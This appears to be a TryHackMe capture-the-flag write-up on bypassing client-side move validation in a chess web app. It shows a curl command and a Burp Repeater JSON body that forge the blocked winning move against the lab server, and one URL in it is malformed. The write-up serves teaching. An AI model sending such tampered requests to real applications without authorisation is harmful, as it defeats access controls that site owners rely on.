
https://tryhackme.com/room/foolsmate

It's mate in one. You know it, the engine knows it, my grandma knows it. The board says checkmate is one click away. The engine says no. Settle the argument.

You can access the web app from your AttackBox's browser via: `http://10.130.159.175`

---


## Reconnaissance 

First, I opened the main page of the application:

```URL
http://10.130.159.175
```

![](images/Pasted%20image%2020260929145433.png)

When attempting to move the piece to the winning square a8, the application returns an error message.

![](images/Pasted%20image%2020260929145655.png)

To understand the cause of the error, the nest step was to inspect the application's internal code
I found a JavaScript file:

```URL
http://10.130.159.175/js/app.js
```

![](images/Pasted%20image%2020260929184708.png)

The JavaScript logic prevents us from moving the piece to the winning position on the chessboard

![](images/Pasted%20image%2020260929184854.png)

---


## Exploitation

Using the browser's DevTools, I obtained the parameters of a valid request. For example, I made a move from a1 to a2.

![](images/Pasted%20image%2020260929185112.png)


Since curl does not behave like a browser and does not execute JavaScript, I tried sending the request directly from the CLI using the parameters and data obtained from the valid request.

Before sending the request, make sure that your piece is positioned on "a1".

```bash
curl -s -b "sid=36f9e1b41049a443a8a8a13d8288876c" -X POST -H "Content-Type: application/json" -d '{"from":"a1","to":"a8"}' http://10.159.175/api/move
```
The server accepts the request and returns:

```JSON
{"ok":true,
"move":"a1a8",
"fen":"R5k1/5ppp/8/8/8/8/5PPP/6K1 b - - 1 1",
"status":"checkmate",
"turn":"b",
"winner":"white",
"flag":"<REDACTED>"} 
```

The request was accepted even though the browser interface did not allow the move.

This shows that the move validation wwas performed client-side rather than server-side.

---


## Burp Repeater

The same result can be achieved using Burp Repeater.
First, intercept a valid request and send it to Repeater.
Then modify the JSON body to contain the desired move. For example:

```JSON
{"from":"a1","to":"a8"}
```

Send the request and receive the flag.

![](images/Pasted%20image%2020260929190328.png)

---


## Summary 

The application relied on client-side JavaScript to validate chess moves. The move validation was performed only on the client side, while the server accepted the same request without executing the client-side JavaScript.

The server accepted the request and returned the checkmate status and the flag.